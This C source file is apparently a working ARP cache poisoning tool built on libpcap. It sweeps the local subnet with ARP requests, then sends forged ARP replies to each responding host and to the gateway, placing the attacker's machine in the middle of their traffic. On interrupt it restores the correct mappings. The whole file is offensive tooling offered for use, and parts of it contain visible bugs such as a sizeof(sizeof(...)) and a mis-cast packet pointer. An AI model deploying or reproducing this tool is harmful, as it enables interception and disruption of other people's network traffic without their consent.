#include <stdio.h>
#include <getopt.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <signal.h>
#include <pcap/pcap.h>
#include <get_num.h>
#include <help_ip.h>

typedef struct node {
    struct node *next;
    ip_t ip;
    mac_t mac;
} node_t;

struct option long_option[] =
    {{"net_interface", required_argument, NULL, 'i'},
     {"gateway_ip", required_argument, NULL, 'g'},
     {"gateway_mac", required_argument, NULL, 'a'},
     {"delay", required_argument, NULL, 't'}};

static mac_t BROADCAST_MAC = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

char errbuf[PCAP_ERRBUF_SIZE];
char buff_detect[PACKET_MAX_LENGTH];
char buff_send[PACKET_MAX_LENGTH];

pcap_t *handle;
pthread_t thread_id;
char stop_reader = 0;

mac_t src_mac;
ip_t src_ip;
mac_t gateway_mac;
ip_t gateway_ip;
int delay_s = 10;

node_t *head_node = NULL;

node_t *add_node(node_t *head, ip_t ip, mac_t mac) {
    node_t *new_head = (node_t*)malloc(sizeof(node_t));
    memset(new_head, '\0', sizeof(sizeof(node_t)));
    new_head->next = head;
    new_head->ip = ip;
    memcpy(new_head->mac.addr, mac.addr, ETHERNET_ADDR_LEN);
    printf("Add %x\n", new_head->ip);
    return new_head;
}

char exist_node(node_t *head, ip_t ip, mac_t mac) {
    node_t *tmp = head;
    while (tmp != NULL) {
        if (tmp->ip == ip && memcmp(tmp->mac.addr, mac.addr, ETHERNET_ADDR_LEN) == 0) {
            return 1;
        }
        tmp = tmp->next;
    }
    return 0;
}

void clear_node(node_t *head) {
    node_t *tmp = head;
    while (tmp != NULL) {
        tmp = tmp->next;
        printf("Removing %x\n", head->ip);
        free(head);
        head = tmp;
    }
}

size_t set_buf_arp(char *buf, mac_t src_mac, mac_t dst_mac, ip_t src_ip, ip_t dst_ip, unsigned short op) {
    ethernet_frame_t ethernet;
    memcpy(ethernet.ethernet_dhost, dst_mac.addr, ETHERNET_ADDR_LEN);
    memcpy(ethernet.ethernet_shost, src_mac.addr, ETHERNET_ADDR_LEN);
    ethernet.ethernet_type = htons(0x0806);

    arp_frame_t arp;
    arp.arp_hardware_type = htons(0x01);
    arp.arp_protocol = htons(0x0800);
    arp.arp_hardware_address_length = 0x06;
    arp.arp_protocol_address_length = 0x04;
    arp.arp_opcode = htons(op);
    memcpy(arp.arp_src_hardware_address, src_mac.addr, ETHERNET_ADDR_LEN);
    ip_t tmp = htonl(src_ip);
    memcpy(arp.arp_src_ip_address, &tmp, IP_ADDR_LEN);
    memcpy(arp.arp_dst_hardware_address, dst_mac.addr, ETHERNET_ADDR_LEN);
    tmp = htonl(dst_ip);
    memcpy(arp.arp_dst_ip_address, &tmp, IP_ADDR_LEN);

    memcpy(buf, &ethernet, sizeof(ethernet));
    memcpy(&buf[sizeof(ethernet)], &arp, sizeof(arp));
    return 60;
}

char set_filter_arp() {
    struct bpf_program fp;
    bpf_u_int32 net = 0;
    if (pcap_compile(handle, &fp, "arp[7]=2", 0, net) == -1) {
        return 0;
    }
    if (pcap_setfilter(handle, &fp) == -1) {
        return 0;
    }
    return 1;
}

void attack_user(ip_t dst_ip, mac_t dst_mac) {
    size_t len = set_buf_arp(buff_send, src_mac, dst_mac, gateway_ip, dst_ip, 0x02);
    pcap_sendpacket(handle, (const unsigned char*)&buff_send, len);
    memset(buff_send, '\0', PACKET_MAX_LENGTH);
    len = set_buf_arp(buff_send, src_mac, gateway_mac, dst_ip, gateway_ip, 0x02);
    pcap_sendpacket(handle, (const unsigned char*)&buff_send, len);
    memset(buff_send, '\0', PACKET_MAX_LENGTH);
}

void monitor_new_user(const unsigned char* packet) {
    ethernet_frame_t *ethernet = (ethernet_frame_t*)&packet;
    arp_frame_t *arp = (arp_frame_t*)&packet[sizeof(ethernet_frame_t)];

    if (memcmp(&arp->arp_src_hardware_address, &src_mac.addr, ETHERNET_ADDR_LEN) == 0) {
        //we don't do anything for local mac;
        return;
    }

    mac_t dst_mac;
    memcpy(&dst_mac, arp->arp_src_hardware_address, ETHERNET_ADDR_LEN);
    ip_t dst_ip = decode_ip(arp->arp_src_ip_address);
    attack_user(dst_ip, dst_mac);

    if (!exist_node(head_node, dst_ip, dst_mac))
        head_node = add_node(head_node, dst_ip, dst_mac);
}

void restore_user(ip_t dst_ip, mac_t dst_mac) {
    printf("Restoring ip: %x\n", dst_ip);
    printf("Restoring mac: %x-%x-%x-%x-%x-%x\n", dst_mac.addr[0], dst_mac.addr[1], dst_mac.addr[2],
                                                dst_mac.addr[3], dst_mac.addr[4], dst_mac.addr[5]);

    size_t len = set_buf_arp(buff_send, dst_mac, gateway_mac, dst_ip, gateway_ip, 0x02);
    pcap_sendpacket(handle, (const unsigned char*)&buff_send, len);
    memset(buff_send, '\0', PACKET_MAX_LENGTH);
    len = set_buf_arp(buff_send, gateway_mac, dst_mac, gateway_ip, dst_ip, 0x02);
    pcap_sendpacket(handle, (const unsigned char*)&buff_send, len);
    memset(buff_send, '\0', PACKET_MAX_LENGTH);
    len = set_buf_arp(buff_send, src_mac, dst_mac, src_ip, dst_ip, 0x02);
    pcap_sendpacket(handle, (const unsigned char*)&buff_send, len);
    memset(buff_send, '\0', PACKET_MAX_LENGTH);
    len = set_buf_arp(buff_send, src_mac, gateway_mac, src_ip, gateway_ip, 0x02);
    pcap_sendpacket(handle, (const unsigned char*)&buff_send, len);
    memset(buff_send, '\0', PACKET_MAX_LENGTH);
}

void monitor_existing_users() {
    printf("Monitor existing users\n");
    node_t *tmp = head_node;
    while (tmp != NULL) {
        attack_user(tmp->ip, tmp->mac);
        tmp = tmp->next;
    }
}

void *read_impl(void *args) {
    while (!stop_reader) {

        struct pcap_pkthdr *header;
        const unsigned char *packet;
        memset(&header, '\0', sizeof(struct pcap_pkthdr));
        int res = pcap_next_ex(handle, &header, &packet);
        if (res != 1) {
            //sleep(5);
            //monitor_existing_users();
            continue;
        }

        monitor_new_user(packet);
    }

    printf("Stopping\n");
    for (int i = 0; i < 60; ++i) {
        node_t *tmp = head_node;
        while (tmp != NULL) {
            if (tmp->ip != gateway_ip && memcmp(tmp->mac.addr, gateway_mac.addr, ETHERNET_ADDR_LEN) != 0)
                restore_user(tmp->ip, tmp->mac);
            tmp = tmp->next;
        }
        sleep(5);
    }

    clear_node(head_node);
    return NULL;
}

char start_reader() {
    stop_reader = 0;
    if (pthread_create(&thread_id, NULL, read_impl, NULL) == -1) {
        return 0;
    }
    return 1;
}

void handleIntr(int s) {
    stop_reader = 1;
}

int main(int argc, char *argv[]) {
    char c;
    char *net_interface = "wlp3s0";

    while ((c = getopt_long(argc, argv, "i:t:g:a:h", long_option, NULL)) != -1) {
        switch (c) {
            case -1:
            case 0:
                break;
            case 'i':
                net_interface = optarg;
                break;
            case 'g':
                gateway_ip = get_ip(optarg);
                break;
            case 'a':
                gateway_mac = get_mac(optarg);
                break;
            case 't':
                delay_s = get_int(optarg, GN_NONNEG, "delay");
                break;
            case 'h':
                printf("Usage %s [OPTIONS]\n", argv[0]);
                printf("    -i net_interface\n");
                printf("    -g gateway_ip\n");
                printf("    -a gateway_mac\n");
                printf("    -t delay\n");
                printf("    -h help\n");
                return 0;
            case ':':
            case '?':
                fprintf(stderr, "Try %s -h for more information\n", argv[0]);
                return -1;
            default:
                fprintf(stderr, "%s: Invalid option -%c\n", argv[0], c);
                fprintf(stderr, "Try %s -h for more information\n", argv[0]);
                return -1;
        }
    }

    struct sigaction act;
    act.sa_handler = handleIntr;
    if (sigaction(SIGINT, &act, NULL) != 0) {
        fprintf(stderr, "Error %s\n", strerror(errno));
        return -1;
    }

    if (!is_valid(net_interface)) {
        fprintf(stderr, "Interface %s doesn't exist\n", net_interface);
        return -1;
    }

    src_mac = get_mac_if(net_interface);
    src_ip = get_ip_if(net_interface);
    mask_t mask = get_mask_if(net_interface);

    handle = pcap_open_live(net_interface, PACKET_MAX_LENGTH, 1, 5000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open interface %s\n", net_interface);
        return -1;
    }

    if (pcap_setnonblock(handle, 1, errbuf) == -1) {
        fprintf(stderr, "Error: %s", errbuf);
        return -1;
    }

    if (set_filter_arp() == 0) {
        fprintf(stderr, "Filter not set\n");
        return -1;
    }

    if (start_reader() == 0) {
        fprintf(stderr, "Couldn't start start the reader\n");
        return -1;
    }

    while (!stop_reader) {
        for (unsigned int i = 0, dst_ip = get_next_ip(gateway_ip, i);
            dst_ip <= get_broadcast(gateway_ip, mask);
            dst_ip = get_next_ip(gateway_ip, ++i)) {
                size_t len = set_buf_arp(buff_detect, src_mac, BROADCAST_MAC, src_ip, dst_ip, 0x01);
                pcap_sendpacket(handle, (const unsigned char*)&buff_detect, len);
                memset(buff_detect, '\0', PACKET_MAX_LENGTH);
            }
        sleep(delay_s);
    }
    printf("Sender stop\n");
    pthread_join(thread_id, NULL);
    return 0;
}